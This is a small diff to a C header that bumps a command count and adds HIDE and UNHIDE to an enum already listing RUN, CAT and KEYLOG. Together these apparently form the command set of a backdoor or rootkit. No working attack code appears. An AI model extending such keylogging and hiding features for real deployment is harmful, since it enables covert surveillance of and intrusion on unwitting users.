@@ -5,7 +5,7 @@
 
 
 // number of valid commands
-#define COMMAND_NUM 3
+#define COMMAND_NUM 5
 
 
 // actions whic user can perform
@@ -13,6 +13,8 @@ typedef enum {
   RUN, 
   CAT,
   KEYLOG,
+  HIDE,
+  UNHIDE,
   BAD_COMMAND
 } command_t;
 
